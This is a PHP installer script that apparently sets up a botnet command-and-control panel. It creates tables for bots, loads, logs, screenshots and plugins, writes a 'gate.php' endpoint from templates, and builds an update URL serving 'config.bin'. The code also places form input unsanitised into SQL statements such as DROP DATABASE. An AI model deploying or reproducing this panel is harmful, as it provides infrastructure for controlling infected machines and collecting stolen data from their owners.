<?php
	set_time_limit(0);
	include_once "common.php";	
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html>
<head>
	<link href='style.css' rel='stylesheet' type='text/css'/>
	<meta http-equiv='Content-Type' content='text/html; charset=windows-1251'/>
</head>	
<div align='left' style="width:100%"><fieldset style="background: #FCFCFC none repeat scroll 0% 0%; width: 720px; -moz-background-clip: border; -moz-background-origin: padding; -moz-background-inline-policy: continuous;"><legend align="center"><b>LOGS</b>:</legend>
<ul><hr size='1' style="color:#CCC"/><br/>

<?php	
	if( file_exists("../config.php") ) die("<center><font class='error'>Delete <b>config.php</b> before instalation!</font>");

	if( !isset($_POST['DB_SERVER']) || !isset($_POST['DB_NAME']) || !isset($_POST['DB_USER']) || !isset($_POST['DB_PASSWORD']) )
	die('<font class="error">Data send error</font>');

	$db_host = $DB_SERVER = $_POST['DB_SERVER'];
	$db_database = $DB_NAME = $_POST['DB_NAME'];
	$db_user = $DB_USER = $_POST['DB_USER'];
	$db_pswd = $DB_PASSWORD = $_POST['DB_PASSWORD'];
	$dropdb = $_POST['dropdb'];

	@$dropdb ? $dropdb = true : $dropdb = false;

	if( $DB_SERVER==='' || $DB_NAME==='' || $DB_USER==='' || $DB_PASSWORD==='')
		die('<font class="error">Please fill the all fields</font>');

	echo "<b>" . gmdate('Y.m.d H:i:s') . "</b> : start install<br><br>";
	flush();
	
	// checking php
	if (!function_exists('mysql_connect'))
		die("<font class='error'>ERROR</font> : mysql_connect() is not exists!");
	if (!function_exists('mysqli_connect'))
		die("<font class='error'>ERROR</font> : mysqli_connect() is not exists!");
	if (!function_exists('file_get_contents'))
		die("<font class='error'>ERROR</font> : file_get_contents () is not exists!");
	if (!function_exists('file_put_contents'))
		die("<font class='error'>ERROR</font> : file_put_contents() is not exists!");

	flush();

	// install stuff
	$db = @mysql_connect($DB_SERVER, $DB_USER, $DB_PASSWORD);
	if (!$db)
		die("<font class='error'>ERROR</font> : mysql_connect fails : " . mysql_error());

	// getting path to mysql
	$sql = "SELECT @@basedir";
	$res = @mysql_query($sql);
	if (!$res) die("<font class='error'>ERROR</font> : cannot execute \" $sql \" : " . mysql_error());
	
	list($mysqlpath) = mysql_fetch_row($res);

	if ($dropdb) 
	{
		echo '<br><li> Dropping DB...';
		flush();
		$dbdump = './base.sql';
		if (!file_exists($dbdump))
			die("<font class='error'>ERROR</font> : file \"$dbdump\" is not exists");

		$sql = "DROP DATABASE IF EXISTS $DB_NAME;";
		$res = @mysql_query($sql);
		if (!$res)
			die("<font class='error'>ERROR</font> : cannot execute \" $sql \" : " . mysql_error());
		echo " [ + ]<br>";			
			
		$sql = "CREATE DATABASE $DB_NAME;";
		$res = @mysql_query($sql);
		if (!$res)
			die("<font class='error'>ERROR</font> : cannot execute \" $sql \" : " . mysql_error());
		echo '<br><li> Importing DB...<br>';
		flush();
		$dbdumpsql = file_get_contents($dbdump);
		$queries = preg_split("/;+(?=([^'|^\\\']*['|\\\'][^'|^\\\']*['|\\\'])*[^'|^\\\']*[^'|^\\\']$)/", $dbdumpsql);
		mysql_select_db($DB_NAME);
		foreach ($queries as $query)
		{
			if (strlen(trim($query)) > 0) 
			{
				$res = @mysql_query($query);
				if (!$res)
					die("<font class='error'>ERROR</font> : cannot execute \" $query \" : " . mysql_error());
			}
		} 
	}

	$tables = array('bots_t','city_t','configs_t','country_t','files_t','geo_city','geo_country','geo_loc',
					'ip_t','loads_rep_t','loads_t','logs_t','os_t','plugins','screens_t','users_t');

	$dbase_is = mysqli_connect ($DB_SERVER, $DB_USER, $DB_PASSWORD, 'INFORMATION_SCHEMA');	
	if (mysqli_connect_errno())
		die("<font class='error'>ERROR</font> : Connect failed : " . mysqli_connect_error());

	define('IN_BNCP', true);
	include_once getcwd()."/db.php";
	$db = new DB();
	flush();
	echo "<b>Existing tables : </b> ";
	for ($i = 0; $i < count($tables); $i++) 
	{
		// db is ok?
		$table = $tables[$i];
		$sql = "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA = '$DB_NAME' AND TABLE_NAME = '$table' LIMIT 1";
		$res = @$db->query($sql)
			or die("<font class='error'>ERROR</font> : bad sql : \" $sql \" : " . $db->error);
		if ($db->affected_rows == 0)
			die("<font class='error'>ERROR</font> : table <i>$table</i> is not exists : \" $sql \"");
		echo "$table, ";
	}
	echo "<br>";
	flush();
	$update_path = $_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'];
	$update_path = "http://".substr($update_path,0,strlen($update_path)-22)."mod/getfile.php?name=config.bin";
	
	if( $dropdb )
	{

		# create configs
		echo '<br><li> Creating configs...';
		flush();
		$ini = parse_ini_file('./config.ini');
		$res = $db->InstallConfigs($ini);
		
		if (!$res) die("<font class='error'>ERROR</font> : cannot create configs : " . $db->error);
		echo " ( $res items ) [ + ]<br>";
	}

	// dumping config.php
	echo '<br><li> Dumping <b>gate.php</b> : <br>';
	flush();

	$file = "config.tpl";
	$gfile = "gate.tpl";
	$config = file_get_contents($file);
	$gate   = file_get_contents($gfile);
	if($config && $gate)
	{
		$config = str_replace('{$DB_HOST}', $db_host, $config);
		$config = str_replace('{$DB_USER}', $db_user, $config);
		$config = str_replace('{$DB_PASS}', $db_pswd, $config);
		$config = str_replace('{$DB_DATABASE}', $db_database, $config);
		
		$res = @file_put_contents(ROOT_PATH."/gate.php", $config.$gate);
		if ( $res )	echo " &nbsp; &nbsp; \"$file\" was dumped <b>successfully [ + ]</b><br>";
		else die("<font class='error'>ERROR</font> : file_put_contents() fails on \"$file\"");
	}
	else die("<font class='error'>ERROR</font> : file_get_contents() fails on \"$file\"");
	
    # inserting data of csv file into database table
    function in_table($table, $csv, $db, $count = 1000){
        // validation parameters
        if (!is_array($table) || empty($table['name']) || !is_array($table['fields']) || !file_exists($csv) || !$db) return false;
        # begin import
        //create query prefix
        $prefix = 'INSERT INTO '.$table['name'].'('.implode(',', $table['fields']).') VALUES ';
        $fp = fopen($csv, 'r');
        //end of file
        $values = array(1);
        //insert data into table
        while (!empty($values)){
            $values = array();
            //read file
            while(($data = fgetcsv($fp, 1000, ",")) !== FALSE){
                $values [] = "(\"".implode("\", \"", $data)."\")";
                if ($count == count($values)) break;     
            }
            //execute query
            if (!empty($values)){
                $sql = str_ireplace("'\N'", 'NULL', $prefix.implode(', ', $values));
                if ($db->query($sql) === FALSE) { break; return false; }
            }  
        }
        fclose($fp);
        return true;
    };
    
	if( $dropdb )
	{	
		echo '<br><li> Wait for loading <b>loc</b> table data .. <br>';
		flush();
		$file = str_replace("\\","/",getcwd()).'/csv/loc.csv';
		if(!in_table(array('name' => 'geo_loc', 'fields' => array('loc_id', 'start', 'end')), $file, $db)) 
            die("<font class='error'>ERROR</font>");
        /*$sql = "load data local infile '$file' into table geo_loc fields terminated by ',' 
				enclosed by '\"' lines terminated by '\\n' (loc_id, start, end);";
        
		$db->query($sql);
		if( !$db->affected_rows ) die("<font class='error'>ERROR</font> : load error : " . $db->error);*/
		echo " <b>[ + ] complete</b><br>";
        
		echo '<br><li> Wait for loading <b>city</b> table data .. <br>';
		flush();
		$file = str_replace("\\","/",getcwd()).'/csv/city.csv';
        if(!in_table(array('name' => 'geo_city', 'fields' => array('locId', 'tc', 'tr', 'tn')), $file, $db)) 
            die("<font class='error'>ERROR</font>");
		/*$sql = "load data local infile '$file' into table geo_city fields terminated by ',' 
				enclosed by '\"' lines terminated by '\\n' (locId, tc, tr, tn);";
		$db->query($sql);
		if( !$db->affected_rows ) die("<font class='error'>ERROR</font> : load error : " . $db->error);*/
		echo " <b>[ + ] complete</b><br>";	
		
		echo '<br><li> Wait for loading <b>country</b> table data .. <br>';
		flush();
		$file = str_replace("\\","/",getcwd()).'/csv/country.csv';
		if(!in_table(array('name' => 'geo_country', 'fields' => array('cc', 'cn')), $file, $db)) 
            die("<font class='error'>ERROR</font>");
        /*$sql = "load data local infile '$file' into table geo_country fields terminated by ',' 
				enclosed by '\"' lines terminated by '\\n' (cc,cn);";
		$db->query($sql);
		if( !$db->affected_rows ) die("<font class='error'>ERROR</font> : load error : " . $db->error);*/
		echo " <b>[ + ] complete</b><br>";	
	}

?>
<br /><br /><center><font class='ok'>You need to delete Installer folder!</font>
</ul></fieldset></div>
</html>